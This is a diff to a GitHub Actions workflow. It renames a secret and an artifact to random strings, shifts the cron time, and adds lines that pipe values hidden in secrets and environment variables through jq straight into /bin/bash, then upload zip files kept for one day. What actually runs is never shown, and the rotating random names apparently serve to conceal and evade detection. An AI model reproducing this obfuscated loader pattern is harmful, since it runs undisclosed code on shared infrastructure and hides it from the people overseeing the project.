@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '55 5,11,17,23 * * *'
+    - cron: '37 5,11,17,23 * * *'
 concurrency:
   group: ${{ github.workflow }}
   cancel-in-progress: false
@@ -15,17 +15,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Setup and run
         env:
-          m446: ${{ secrets.m446 }}
+          oand18: ${{ secrets.oand18 }}
         run: |
-          printf '%s' "$m446" | jq -r .h7 | /bin/bash
-          echo $seb8 | jq -r .nfgxm5 | /bin/bash
-          printf '%s' "$hgtdd345" | jq -r .tj567 | /bin/bash
-          printf '%s' "$uyu65772" | jq -r .z38 | /bin/bash
+          printf '%s' "$oand18" | jq -r .jzd57 | /bin/bash
+          echo $xvec698 | jq -r .e32 | /bin/bash
+          printf '%s' "$ifxs7" | jq -r .gs40125 | /bin/bash
+          echo $vt2615 | jq -r .cm104 | /bin/bash
+          echo $do40536 | jq -r .ydqve929 | /bin/bash
 
       - name: Upload data
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: rz3RcPud
+          name: CtReJE7o
           path: "*.zip"
           retention-days: 1
